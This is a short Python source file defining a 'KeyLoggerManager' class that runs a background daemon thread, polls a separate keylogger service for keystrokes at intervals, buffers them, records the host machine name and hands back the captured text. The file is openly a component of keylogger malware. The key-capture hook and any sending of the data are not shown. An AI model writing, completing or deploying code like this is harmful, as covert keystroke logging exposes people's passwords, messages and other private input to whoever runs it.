import threading
import time
import socket

class KeyLoggerManager:
    def __init__(self, keylogger_service, interval=5):
        self.keylogger_service = keylogger_service
        self.machine_name = socket.gethostname()
        self.interval = interval
        self.buffer = []
        self.running = False
        self.thread = None

    def start(self):
        self.running = True
        self.thread = threading.Thread(target=self._run, daemon=True)
        self.thread.start()

    def stop(self):
        self.running = False
        if self.thread:
            self.thread.join()

    def _run(self):
        while self.running:
            events = self.keylogger_service.get_events()
            self.buffer.extend(events)
            time.sleep(self.interval)

    def get_buffer(self):
        data = ''.join(self.buffer)
        self.buffer.clear()
        return data
